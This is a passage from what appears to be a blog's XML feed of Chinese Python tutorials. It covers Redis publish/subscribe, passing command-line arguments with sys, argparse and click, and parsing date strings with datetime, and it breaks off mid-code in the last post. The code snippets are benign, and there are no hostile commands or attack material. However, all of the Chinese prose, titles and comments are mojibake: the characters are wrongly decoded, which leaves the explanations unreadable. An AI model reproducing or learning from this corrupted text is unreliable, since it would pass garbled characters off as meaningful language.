punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"é¢‘é“ &#123;&#125; å‘æ¥æ–°æ¶ˆæ¯:&#123;&#125;"</span> <span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>item<span class="token punctuation">[</span><span class="token string">'channel'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> data <span class="token operator">==</span> <span class="token string">'exit'</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>item<span class="token punctuation">[</span><span class="token string">'channel'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'å‘å¸ƒç»“æŸ'</span><span class="token punctuation">)</span>            <span class="token keyword">break</span>p<span class="token punctuation">.</span>unsubscribe<span class="token punctuation">(</span><span class="token string">'cctv'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"å–æ¶ˆè®¢é˜…"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><br>å¯åŠ¨æ•ˆæœï¼š<br><img src="https://img-blog.csdnimg.cn/2020070812511493.png#pic_center =284x131" alt=""><br>ç›‘å¬è¿‡ç¨‹ä¸­ä¸»è¦ä¼ è¾“çš„<code>item</code>å…·ä½“åŒ…å«ä¸‹é¢çš„ä¿¡æ¯ï¼š</p><ul><li><p><code>type</code>:  <code>subscribe</code>, <code>unsubscribe</code>, <code>psubscribe</code>, <code>punsubscribe</code>, <code>message</code>, <code>pmessage</code>ä¹‹ä¸€ï¼Œç”¨äºè¯†åˆ«ç›‘å¬åˆ°çš„æ•°æ®ç±»å‹ï¼Œä¸€èˆ¬ç¬¬ä¸€æ¬¡è®¢é˜…æ˜¯<code>subscribe</code>,åé¢éƒ½æ˜¯<code>message</code>ã€‚  </p><blockquote><p>{â€˜typeâ€™: â€˜subscribeâ€™, â€˜patternâ€™: None, â€˜channelâ€™: bâ€™cctvâ€™, â€˜dataâ€™: 1}</p></blockquote></li><li><p><code>channel</code>: å‘å¸ƒæ¶ˆæ¯çš„é¢‘é“</p></li><li><code>pattern</code>: ç”¨äºåŒ¹é…å‘å¸ƒæ¶ˆæ¯çš„é¢‘é“æ¨¡å¼,ä¸€èˆ¬è€Œè¨€ï¼Œæˆ‘ä»¬ç”¨ä¸åˆ°è¿™ä¸ªï¼Œéƒ½æ˜¯<code>None</code></li><li><code>data</code>: å…·ä½“çš„ä¼ è¾“ä¿¡æ¯<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2></li></ul><p><code>redis</code>æ˜¯ä¸€ä¸ªé«˜é€Ÿçš„å†…å­˜æ•°æ®åº“ï¼Œåœ¨åˆ¶ä½œå°æœ‰è§„æ¨¡çš„é¡¹ç›®æ—¶éš¾å…ä¼šé‡åˆ°å¯¹äºæ•°æ®çš„ä¸´æ—¶å­˜å‚¨ï¼Œ<code>redis</code>æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„è§£å†³æ–¹æ¡ˆã€‚åœ¨åº”ç”¨å¤šè¿›ç¨‹çš„æ—¶å€™ï¼Œå¯ä»¥å¾ˆå¥½åœ°åˆ©ç”¨å‘å¸ƒä¸è®¢é˜…çš„æœºåˆ¶è¿›è¡Œæ¶ˆæ¯çš„å…±äº«ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>redis</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pythonå¦‚ä½•ä¼˜é›…åœ°åœ¨å‘½ä»¤è¡Œä¼ å…¥å‚æ•°ï¼Ÿsys,argparse,clickä½¿ç”¨</title>
    <link href="/article/47448.html"/>
    <url>/article/47448.html</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ä¸€äº›å¤§å‹çš„<code>python</code>é¡¹ç›®ç»å¸¸æ€§ä¼šæä¾›å‘½ä»¤è¡Œçš„æ¥å£ä½¿å¾—åŒæ ·ä¸€ä¸ªæ–‡ä»¶èƒ½å¤Ÿæ ¹æ®å‚æ•°çš„ä¸åŒæ‰§è¡Œä¸åŒçš„æ“ä½œã€‚å¸¸è§çš„å¦‚<code>python main.py --name=&#39;zhangsan&#39; --age=20</code>ï¼Œè¿™è®©ç”¨æˆ·èƒ½å¤Ÿéœ€æ±‚é€‰æ‹©ä¸åŒçš„æœåŠ¡å¯åŠ¨å¹¶é€‰æ‹©ä¸åŒçš„å‚æ•°é…ç½®ï¼Œå®ç°è¿™ä¸€æ“ä½œçš„æ–¹æ³•æœ‰å¾ˆå¤šï¼Œæ¯”è¾ƒå¸¸è§çš„æ˜¯ä¸‰ç§ï¼š<code>sys</code>,<code>argparse</code>,<code>click</code>ã€‚</p><h2 id="sys"><a href="#sys" class="headerlink" title="sys"></a>sys</h2><p><code>sys</code>æ˜¯<code>python</code>è‡ªå¸¦çš„æ¨¡å—ï¼Œå¯ä»¥é€šè¿‡<code>sys.argv</code>è·å–åˆ°è¾“å…¥çš„å‚æ•°ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š<br><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sys<span class="token keyword">def</span> <span class="token function">hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    hello<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#  python3 test.py hey 23</span><span class="token comment"># >> ['test.py', 'hey', '23']</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><br><code>sys.argv</code>è¿”å›ä¸€ä¸ªåˆ—è¡¨ï¼Œç¬¬ä¸€é¡¹æ˜¯æ‰§è¡Œçš„æ–‡ä»¶åï¼Œåé¢ä¾æ¬¡æ˜¯è¾“å…¥çš„æœªæŒ‡å®šå‚æ•°ã€‚</p><p>è¯¥æ¨¡å—ååˆ†ç®€å•æ˜“æ‡‚ä¸”æ–¹ä¾¿ä½¿ç”¨ï¼Œä¸è¿‡ç¼ºç‚¹ä¹Ÿå¾ˆæ˜æ˜¾ï¼Œæ— æ³•æŒ‡å®šå‚æ•°çš„åç§°ï¼Œè¾“å…¥çš„å‚æ•°å¿…é¡»æŒ‰ç…§æŒ‡å®šé¡ºåºï¼Œä¸”æ²¡æœ‰<code>help</code>æ‰“å°å¸®åŠ©ä¿¡æ¯ï¼ˆæŒ‡æ˜æ¯ä¸ªå‚æ•°çš„ä½œç”¨ï¼‰ï¼Œéœ€è¦å¼€å‘è€…æ‰‹åŠ¨åˆ›å»ºä¸€ä¸ªã€‚</p><h2 id="argparse"><a href="#argparse" class="headerlink" title="argparse"></a>argparse</h2><p><code>argparse</code>æ˜¯ä¸€ä¸ªéå¸¸å¥½ç”¨çš„å‘½ä»¤è¡Œå‚æ•°å·¥å…·ï¼Œç›¸æ¯”äº<code>sys</code>ï¼Œå®ƒèƒ½å¤ŸæŒ‡å®šå‚æ•°åç§°ï¼Œå‚æ•°é»˜è®¤å€¼ï¼Œå‚æ•°çš„æè¿°ä¿¡æ¯ç­‰ï¼Œå…·ä½“å¦‚ä¸‹ï¼š<br><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> argparse<span class="token keyword">def</span> <span class="token function">hello</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>args<span class="token punctuation">.</span>name<span class="token punctuation">,</span>args<span class="token punctuation">.</span>age<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    my_arg <span class="token operator">=</span> argparse<span class="token punctuation">.</span>ArgumentParser<span class="token punctuation">(</span><span class="token string">'My argument parser'</span><span class="token punctuation">)</span>    my_arg<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'--name'</span><span class="token punctuation">,</span><span class="token string">'-n'</span><span class="token punctuation">,</span>default<span class="token operator">=</span><span class="token string">'cp'</span><span class="token punctuation">,</span><span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span><span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'Your name'</span><span class="token punctuation">)</span>    my_arg<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'--age'</span><span class="token punctuation">,</span><span class="token string">'-a'</span><span class="token punctuation">,</span>default<span class="token operator">=</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">,</span><span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'Your age'</span><span class="token punctuation">)</span>    args <span class="token operator">=</span> my_arg<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>    hello<span class="token punctuation">(</span>args<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><br><img src="https://img-blog.csdnimg.cn/2020073019470794.png#pic_center =970x215" alt=""><br>é€šè¿‡å£°æ˜ä¸€ä¸ª<code>ArgumentParser</code>å¯¹è±¡ï¼Œå†ä¸ºå…¶æ·»åŠ ç›¸åº”çš„è¾“å…¥å‚æ•°ï¼Œæœ€åè¿›è¡Œ<code>parse_args()</code>å‚æ•°è§£æå°±å¯ä»¥è·å¾—ä»å‘½ä»¤è¡Œè¾“å…¥çš„å‚æ•°ã€‚è¿™ç§æ–¹å¼çš„å¥½å¤„ä¸»è¦åŒ…æ‹¬ï¼š</p><ul><li>å‚æ•°é¡ºåºéšæ„ï¼ŒæŒ‰ç…§å‚æ•°åç§°æŒ‡å®šä¸”åç§°(<code>--name</code>)å¯ä»¥ç”¨ç®€ç§°(<code>-a</code>)å‡å°‘è¾“å…¥</li><li>åŒ…å«<code>help</code>å¸®åŠ©ä¿¡æ¯ï¼Œå¯ä»¥è®©ä½¿ç”¨è€…å¿«é€Ÿç†è§£æ¯ä¸ªå‚æ•°çš„å«ä¹‰</li><li>å¯ä»¥è®¾å®šé»˜è®¤å€¼å’Œæ•°æ®ç±»å‹</li></ul><p>ä½†è¿™ç§æ–¹å¼å¿…é¡»è¦ç»™å‡ºå‚æ•°åç§°ï¼Œä¸åƒ<code>sys</code>é‚£æ ·æŒ‰é¡ºåºè¾“å…¥å‚æ•°å³å¯ã€‚</p><h2 id="click"><a href="#click" class="headerlink" title="click"></a>click</h2><p><code>click</code>è¿™ä¸ªæ¨¡å—ä¹Ÿæ˜¯æˆ‘è¿‘æœŸæ‰ç”¨åˆ°çš„ï¼Œåœ¨ä¸€äº›å¤§å‹é¡¹ç›®ä¸­å‡ºç°è¾ƒå¤šï¼ˆç‰¹åˆ«æ˜¯<code>flask</code>çš„é¡¹ç›®ï¼‰ï¼Œç”¨<code>click</code>èƒ½å¤Ÿç”¨æ›´å°‘çš„ä»£ç å®ç°ä¸<code>argparse</code>ç±»ä¼¼çš„åŠŸèƒ½ï¼Œä¸”çœ‹èµ·æ¥æ›´åŠ ç®€æ´ã€‚<br><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> click<span class="token decorator annotation punctuation">@click<span class="token punctuation">.</span>command</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@click<span class="token punctuation">.</span>option</span><span class="token punctuation">(</span><span class="token string">'--name'</span><span class="token punctuation">,</span>default<span class="token operator">=</span> <span class="token string">'cp'</span><span class="token punctuation">,</span><span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span><span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'Your name'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@click<span class="token punctuation">.</span>option</span><span class="token punctuation">(</span><span class="token string">'--age'</span><span class="token punctuation">,</span>default<span class="token operator">=</span><span class="token number">24</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">,</span><span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'Your age'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">hello</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span>age<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span>age<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    hello<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><br><img src="https://img-blog.csdnimg.cn/2020073019592243.png#pic_center =1018x184" alt=""><br>å¯ä»¥å‘ç°<code>click</code>å°†ä¸€ä¸ªå‡½æ•°(<code>hello()</code>)å°è£…æˆäº†ä¸€ä¸ªå‘½ä»¤è¡Œæ¥å£ï¼Œå‡½æ•°çš„è¾“å…¥å‚æ•°ç”±<code>option</code>æä¾›çš„å‚æ•°å†³å®šã€‚éœ€è¦æ³¨æ„çš„æ˜¯<code>hello(name,age)</code>ä¸­çš„<code>name,age</code>å‚æ•°åæ˜¯ä¸<code>option</code>æŒ‡å®šçš„å‘½ä»¤è¡Œå‚æ•°åç§°å¯¹åº”çš„ï¼Œå› æ­¤ä¸èƒ½ä»»æ„æ”¹æˆå…¶ä»–åç§°ã€‚<code>click.option</code>è¿˜æœ‰ä¸€ä¸ªå‚æ•°<code>required</code>å¯ä»¥è®¾ç½®å‚æ•°æ˜¯å¦éœ€è¦ï¼Œå¦‚æœè®¾ç½®<code>False</code>ï¼Œä¸”æ²¡æœ‰ç»™å®šé»˜è®¤å€¼ï¼Œé‚£è¿”å›ç»“æœæ˜¯<code>None</code>ï¼Œå¦‚æœè®¾å®š<code>True</code>ä¸”æ²¡æœ‰è¾“å…¥å€¼åˆ™ä¼šæŠ¥é”™ã€‚</p><ul><li><p><code>click.group</code><br>  <code>click</code>è¿˜æœ‰ä¸€ä¸ªé‡è¦çš„æ–¹æ³•<code>group</code>ï¼Œä»–å…è®¸å°†å¤šä¸ªå‡½æ•°æ¥å£è¿æ¥èµ·æ¥ï¼Œå½¢æˆä¸€ç»„ï¼Œç„¶åä¾æ¬¡æ‰§è¡Œï¼Œå…·ä½“å®ä¾‹å¦‚ä¸‹ï¼š</p>  <div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> click<span class="token decorator annotation punctuation">@click<span class="token punctuation">.</span>group</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">one</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"hello one"</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@click<span class="token punctuation">.</span>command</span><span class="token punctuation">(</span>name<span class="token operator">=</span><span class="token string">'second'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@click<span class="token punctuation">.</span>option</span><span class="token punctuation">(</span><span class="token string">"--name"</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">"Your name"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">two</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"hello two: &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@click<span class="token punctuation">.</span>command</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@click<span class="token punctuation">.</span>option</span><span class="token punctuation">(</span><span class="token string">"--age"</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">"Your age"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">three</span><span class="token punctuation">(</span>age<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"hello three:&#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>age<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    one<span class="token punctuation">.</span>add_command<span class="token punctuation">(</span>two<span class="token punctuation">)</span>    one<span class="token punctuation">.</span>add_command<span class="token punctuation">(</span>three<span class="token punctuation">)</span>    one<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><p>  <img src="https://img-blog.csdnimg.cn/20200730202829551.png#pic_center =909x132" alt=""><br>  åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæˆ‘ç»™<code>two()</code>å‡½æ•°çš„<code>command</code>æ·»åŠ äº†<code>name</code>å±æ€§ï¼Œä½¿å¾—åœ¨è°ƒç”¨çš„æ—¶å€™å¯ä»¥ç”¨<code>second</code>æ›¿ä»£<code>two</code>è¿›è¡Œæ¥å£è°ƒç”¨ã€‚ä¸Šé¢çš„æ–¹å¼çš„å¥½å¤„åœ¨äºè¢«<code>group</code>è£…é¥°çš„å‡½æ•°æ˜¯æˆ‘ä»¬ç¡®å®šä¸€å®šè¦æ‰§è¡Œçš„ï¼Œè€Œå¦å¤–ä¸¤ä¸ªåŠ å…¥<code>group</code>çš„å‡½æ•°åˆ™æ ¹æ®æˆ‘ä»¬å‘½ä»¤è¡Œå‚æ•°çš„è¾“å…¥æ‰§è¡Œã€‚</p></li><li><p><code>click.argument</code><br>  é™¤äº†<code>click.option</code>æ·»åŠ å‚æ•°ä»¥å¤–ï¼Œ<code>click</code>è¿˜å¯ä»¥é€šè¿‡<code>click.argument</code>æ·»åŠ å‚æ•°ï¼Œä¸<code>option</code>ä¸åŒçš„æ˜¯ï¼Œ<code>argument</code>ç›´æ¥æŒ‡å®šå‚æ•°å(æ²¡æœ‰<code>--</code>)ï¼Œä¸”æ˜¯æŒ‰ç…§é¡ºåºè¾“å…¥ï¼ˆæœ‰ç‚¹ç±»ä¼¼<code>sys.argv</code>ï¼‰ï¼Œå¦‚ä¸‹ä¾‹å­ï¼š</p>  <div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> click<span class="token decorator annotation punctuation">@click<span class="token punctuation">.</span>command</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@click<span class="token punctuation">.</span>argument</span><span class="token punctuation">(</span><span class="token string">'ip'</span><span class="token punctuation">,</span><span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@click<span class="token punctuation">.</span>argument</span><span class="token punctuation">(</span><span class="token string">'port'</span><span class="token punctuation">,</span><span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">hello</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ip:&#123;&#125;,port:&#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span>port<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    hello<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># python3 test.py '10.1.1.1' 1234</span><span class="token comment"># >> ip:10.1.1.1,port:1234</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></li></ul><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>æœ¬æ–‡è®²è¿°äº†ä¸‰ç§åœ¨å‘½ä»¤è¡Œæ‰§è¡Œ<code>python</code>æ–‡ä»¶æ—¶ä¼ å…¥å‚æ•°çš„æ–¹å¼ï¼Œ<code>sys</code>èƒœåœ¨ç®€ä¾¿ï¼Œåœ¨ä¸€èˆ¬ä¸ªäººçš„å°é¡¹ç›®ä¸­å¯ä»¥å›¾æ–¹ä¾¿ä½¿ç”¨ï¼Œ<code>argparse</code>æ›´ä¸ºæ­£å¼ï¼Œå¯¹å‚æ•°çš„ä¼ é€’æœ‰ä¸¥æ ¼çš„æŠŠæ§ï¼Œ<code>click</code>å…¼å…·ä¸Šé¢ä¸¤è€…ï¼Œä¸”ä»£ç å¯è¯»æ€§å¼ºï¼Œé€‚åˆå¤§å‹çš„é¡¹ç›®ã€‚ä¸‰è€…æ ¹æ®è‡ªå·±éœ€è¦é€‰æ‹©ä½¿ç”¨ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>sys</tag>
      
      <tag>argparse</tag>
      
      <tag>click</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ã€pythonã€‘å­—ç¬¦ä¸²æ—¥æœŸæ ¼å¼æ•°æ®å¤„ç†</title>
    <link href="/article/1104.html"/>
    <url>/article/1104.html</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ç‰¹å¾å·¥ç¨‹ä¸­ç»å¸¸æ€§é‡åˆ°å­—ç¬¦ä¸²å½¢å¼çš„æ—¥æœŸæ•°æ®ï¼Œé€šå¸¸æˆ‘ä»¬éœ€è¦å°†å…¶è½¬æ¢æˆè®¡ç®—æœºèƒ½å¤Ÿç†è§£çš„<code>datetime</code>å¯¹è±¡ï¼Œå¥½å¤„åœ¨äºå¯ä»¥å®ç°æ—¥æœŸæ—©æ™šçš„æ¯”è¾ƒ(ä¾‹å¦‚è¦ç­›é€‰å‡º<code>2019-01-02</code>åˆ°<code>2019-03-04</code>å†…çš„æ•°æ®)ï¼Œæ—¥æœŸçš„åŠ å‡æ³•ç­‰ç³»åˆ—æ“ä½œã€‚<code>python</code>å®ç°è¯¥æ“ä½œçš„æ¨¡å—æ˜¯<code>datetime</code>ï¼ŒåŒæ—¶æ•°æ®åˆ†æå¤„ç†å·¥å…·<code>pandas</code>ä¹Ÿæä¾›äº†ç›¸åº”çš„æ—¶é—´æ ¼å¼å¤„ç†æ–¹æ³•<code>to_datetime()</code>ï¼Œæœ¬æ–‡ä»å®ç”¨æ€§è§’åº¦å‡ºå‘ï¼Œç®€è¦è®²è§£è¿™ä¸¤ç§æ—¶é—´æ ¼å¼å¤„ç†æ–¹å¼ï¼Œå¹¶ä»¥ä¸€ä¸ªå…·ä½“çš„ä¾‹å­å®é™…æ¼”ç¤ºå¦‚ä½•ä½¿ç”¨ã€‚</p><blockquote><p>æ³¨ï¼šæœ¬æ–‡å…³å¿ƒçš„æ˜¯å¯¹äºç»™å®šçš„å­—ç¬¦ä¸²ç±»å‹æ—¶é—´æ•°æ®ï¼Œå¦‚ä½•å¿«é€Ÿè¿›è¡Œè¯»å–å®ä¾‹åŒ–ï¼Œå› æ­¤ä¸ä¼šå¤§ç¯‡å¹…åœ°å»è¯¦ç»†ä»‹ç»æ¨¡å—çš„å„ä¸ªåŠŸèƒ½ã€‚</p></blockquote><h2 id="datetime"><a href="#datetime" class="headerlink" title="datetime"></a>datetime</h2><p>ç”±äº<code>datetime</code>åŒ…å«äº†ä¼—å¤šå¯¹æ—¶é—´æ•°æ®çš„å¤„ç†ã€åˆå§‹åŒ–æ“ä½œï¼Œä¸€ä¸€å­¦ä¹ å¹¶æ²¡æœ‰ç‰¹åˆ«å¤§çš„æ•ˆç›Šï¼Œä¸”å¾ˆå®¹æ˜“å¿˜è®°ï¼Œå› æ­¤ï¼Œé€‚åˆåœ¨å¿…è¦çš„æ—¶å€™æŸ¥è¯¢ä½¿ç”¨ã€‚è¿™é‡Œæä¾›ä¸€ç¯‡å¯¹<code>datetime</code>ä½¿ç”¨è®²è§£ååˆ†è¯¦ç»†çš„æ–‡ç« ï¼š<a href="https://blog.csdn.net/cmzsteven/article/details/64906245">Python datetimeæ¨¡å—è¯¦è§£ã€ç¤ºä¾‹</a>ã€‚</p><blockquote><p>ä½œè€…ä»<code>datetime</code>æ¨¡å—ä¸‹æ‰€æœ‰çš„ç±»è¿›è¡Œäº†è¯¦ç»†çš„ä»‹ç»å’Œä½¿ç”¨ï¼Œå¹¶é™„ä¸Šäº†æ—¥æœŸæ ¼å¼åŒ–ç¬¦å·ï¼Œå¯ä»¥åœ¨éœ€è¦çš„æ—¶å€™è¿›è¡ŒæŸ¥è¯¢ã€‚</p></blockquote><h3 id="datetimeå¤„ç†å­—ç¬¦ä¸²æ—¶é—´æ•°æ®"><a href="#datetimeå¤„ç†å­—ç¬¦ä¸²æ—¶é—´æ•°æ®" class="headerlink" title="datetimeå¤„ç†å­—ç¬¦ä¸²æ—¶é—´æ•°æ®"></a>datetimeå¤„ç†å­—ç¬¦ä¸²æ—¶é—´æ•°æ®</h3><p>ä¸»è¦ç”¨åˆ°äº†<code>datetime.datetime.strptime()</code>ï¼Œèƒ½å¤Ÿæ ¹æ®æŒ‡å®šçš„æ—¥æœŸæ ¼å¼ç¬¦å·ï¼Œä»å­—ç¬¦ä¸²ä¸­æŠ½å–å¾—åˆ°<code>datetime</code>å®ä¾‹ã€‚ä¾‹å¦‚ï¼š<br><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> datetime <span class="token keyword">import</span> datetimedatetime<span class="token punctuation">.</span>strptime<span class="token punctuation">(</span><span class="token string">'2019-01-03'</span><span class="token punctuation">,</span><span class="token string">'%Y-%m-%d'</span><span class="token punctuation">)</span>  <span class="token comment"># datetime.datetime(2019, 1, 3, 0, 0)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div><br><code>%Y(å››ä½å¹´ä»½),%m(æœˆä»½),%d(æœˆå†…ä¸­çš„ä¸€å¤©)</code>æ˜¯æ—¥æœŸçš„æ ¼å¼åŒ–ç¬¦å·ï¼Œæ›´å¤šçš„ç¬¦å·å«ä¹‰å‚è€ƒä¸Šé¢ç»™çš„æ–‡ç« ï¼Œä¼šè‡ªåŠ¨æ£€éªŒæ—¥æœŸçš„åˆæ³•æ€§ï¼Œä¾‹å¦‚2æœˆä¸å¯èƒ½æœ‰30å·ã€‚<br>è½¬æ¢æˆ<code>datetime</code>å®ä¾‹åï¼Œå°±å¯ä»¥åšå¾ˆå¤šæ—¥æœŸçš„éªšæ“ä½œäº†ï¼Œä¾‹å¦‚ï¼š</p><ul><li><strong>æ¯”è¾ƒä¸¤ä¸ªæ—¥æœŸçš„æ—©æ™š</strong>    <div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> datetime <span class="token keyword">import</span> datetimea <span class="token operator">=</span> datetime<span class="token punctuation">.</span>strptime<span class="token punctuation">(</span><span class="token string">'2019-02-20'</span><span class="token punctuation">,</span><span class="token string">'%Y-%m-%d'</span><span class="token punctuation">)</span>b <span class="token operator">=</span> datetime<span class="token punctuation">.</span>strptime<span class="token punctuation">(</span><span class="token string">'2029-02-20'</span><span class="token punctuation">,</span><span class="token string">'%Y-%m-%d'</span><span class="token punctuation">)</span>a <span class="token operator">&lt;</span> b  <span class="token comment"># True</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></div></li><li><strong>è®¡ç®—ä¸¤ä¸ªæ—¥æœŸç›¸å·®é—´éš”</strong>    <div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> datetime <span class="token keyword">import</span> datetimea <span class="token operator">=</span> datetime<span class="token punctuation">.</span>strptime<span class="token punctuation">(</span><span class="token string">'2019-02-20'</span><span class="token punctuation">,</span><span class="token string">'%Y-%m-%d'</span><span class="token punctuation">)</span>b <span class="token operator">=</span> datetime<span class="token punctuation">.</span>strptime<span class="token punctuation">(</span><span class="token string">'2029-02-20'</span><span class="token punctuation">,</span><span class="token 